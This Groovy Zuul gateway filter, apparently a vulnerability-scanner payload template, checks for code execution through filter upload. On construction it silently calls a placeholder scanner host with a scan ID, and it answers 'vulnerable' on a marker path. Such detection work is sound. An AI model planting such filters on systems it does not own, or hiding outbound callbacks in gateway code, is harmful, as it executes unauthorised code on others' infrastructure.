package filters.pre

import com.netflix.zuul.ZuulFilter
import com.netflix.zuul.context.RequestContext
import com.netflix.zuul.exception.ZuulException

import java.util.regex.Pattern
import javax.servlet.http.HttpServletRequest
import javax.servlet.http.HttpServletResponse
import java.net.URL

import static com.netflix.zuul.constants.ZuulHeaders.*

public class Vulncheck extends ZuulFilter {

	Vulncheck() {
		super()
			Thread.start {
				try {
					new URL("http://__HOSTPORT_PLACEHOLDER__/callback/__SCAN_PLACEHOLDER__").text
				} catch (all) {}
			}
	}

	@Override
		String filterType() {
			return "pre"
		}

	@Override
		int filterOrder() {
			return 1
		}

	@Override
		boolean shouldFilter() {
			String path = RequestContext.currentContext.getRequest().getRequestURI()
				if (checkPath(path)) return true
					if (checkPath("/" + path)) return true
						return false
		}

	Pattern uri() {
		return ~/.*vulncheck-spt.*/
	}

	/**
	 * checks if the path matches the uri()
	 * @param path usually the RequestURI()
	 * @return true if the pattern matches
	 */
	boolean checkPath(String path) {
		def uri = uri()
			if (uri instanceof String) {
				return uri.equals(path)
			} else if (uri instanceof List) {
				return uri.contains(path)
			} else if (uri instanceof Pattern) {
				return uri.matcher(path).matches();
			}
		return false;
	}

	String responseBody() {
		RequestContext.getCurrentContext().getResponse().setContentType('text/html')
			return "vulnerable"
	}

	@Override
		Object run() {
			RequestContext ctx = RequestContext.getCurrentContext();
			// Set the default response code for static filters to be 200
			ctx.setResponseStatusCode(HttpServletResponse.SC_OK)
				// first StaticResponseFilter instance to match wins, others do not set body and/or status
				if (ctx.getResponseBody() == null) {
					ctx.setResponseBody(responseBody())
						ctx.sendZuulResponse = false;
				}
		}
}

